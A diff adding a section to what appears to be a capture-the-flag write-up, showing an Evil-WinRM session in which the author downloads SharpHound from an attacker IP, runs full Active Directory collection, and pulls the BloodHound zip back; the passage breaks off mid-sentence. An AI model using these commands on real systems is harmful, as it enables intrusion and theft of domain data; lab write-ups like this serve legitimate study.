@@ -337,5 +337,16 @@ Mode                LastWriteTime         Length Name
 ```
 I now have shell access as this user!
 
+# Running sharphound collection
+```python
+*Evil-WinRM* PS C:\Users\winrm_svc\Documents> wget http://10.10.14.90:8000/SharpHound.exe -o sharphound.exe
+*Evil-WinRM* PS C:\Users\winrm_svc\Documents> ./sharphound.exe -c all
+*Evil-WinRM* PS C:\Users\winrm_svc\Documents> download 20260404151948_BloodHound.zip
+                                        
+Info: Downloading C:\Users\winrm_svc\Documents\20260404151948_BloodHound.zip to 20260404151948_BloodHound.zip
+                                        
+Info: Download successful!
+```
+This shows me getting the ex
 
 
